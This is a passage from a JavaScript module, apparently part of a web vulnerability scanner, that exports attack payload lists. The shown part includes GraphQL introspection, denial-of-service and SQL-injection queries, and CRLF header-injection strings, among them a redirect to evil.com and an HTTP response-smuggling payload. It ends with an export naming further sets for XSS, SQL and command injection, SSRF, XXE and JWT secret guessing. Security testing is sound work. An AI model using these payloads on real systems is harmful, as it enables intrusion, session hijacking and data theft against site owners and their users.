  introspection_full: '{"query":"{__schema{types{name fields{name args{name type{name kind ofType{name}}}type{name kind ofType{name}}}}}}"}',
  dos_nested: '{"query":"query{a:__typename b:__typename c:__typename d:__typename e:__typename f:__typename g:__typename h:__typename i:__typename j:__typename}"}',
  batch: '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]',
  sqli_in_arg: '{"query":"{ user(id: \\"1\' OR 1=1--\\") { name email } }"}',
};

// ═══════════════════════════════════════════════════════════════
// CRLF INJECTION PAYLOADS (35+)
// ═══════════════════════════════════════════════════════════════
export const CRLF_PAYLOADS = [
  '%0d%0aInjected-Header:true',
  '%0d%0aSet-Cookie:crlf=injected',
  '%0d%0a%0d%0a<html>CRLF</html>',
  '%0d%0aX-Injected:true',
  '%0d%0aLocation:https://evil.com',
  '\\r\\nInjected-Header:true',
  '\\r\\nSet-Cookie:crlf=true',
  '%E5%98%8A%E5%98%8DInjected:true',
  '%0aInjected:true',
  '%0dInjected:true',
  '%23%0dInjected:true',
  '%3f%0dInjected:true',
  'test%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>smuggled</html>',
];

// ═══════════════════════════════════════════════════════════════
// DESERIALIZATION PAYLOADS
// ═══════════════════════════════════════════════════════════════
export const DESERIALIZATION = {
  java_indicators: ['rO0AB', 'aced0005', 'H4sIAAAA'],
  php_indicators: ['O:', 'a:', 's:', 'i:', 'b:'],
  python_indicators: ['cos\\n', 'cposix\\n', '\\x80\\x04\\x95'],
  node_indicators: ['{"rce":"_$$ND_FUNC$$_'],
  content_types: [
    'application/x-java-serialized-object',
    'application/x-java-object',
    'application/java-archive',
  ],
};

export default {
  XSS_PAYLOADS, SQLI_PAYLOADS, NOSQLI_PAYLOADS, CMDI_PAYLOADS,
  LFI_PAYLOADS, SSTI_PAYLOADS, SSRF_PAYLOADS, XXE_PAYLOADS,
  REDIRECT_PAYLOADS, CORS_ORIGINS, JWT_SECRETS,
  CACHE_POISON_HEADERS, SMUGGLING_PAYLOADS,
  PROTOTYPE_POLLUTION, GRAPHQL_PAYLOADS, CRLF_PAYLOADS, DESERIALIZATION,
};
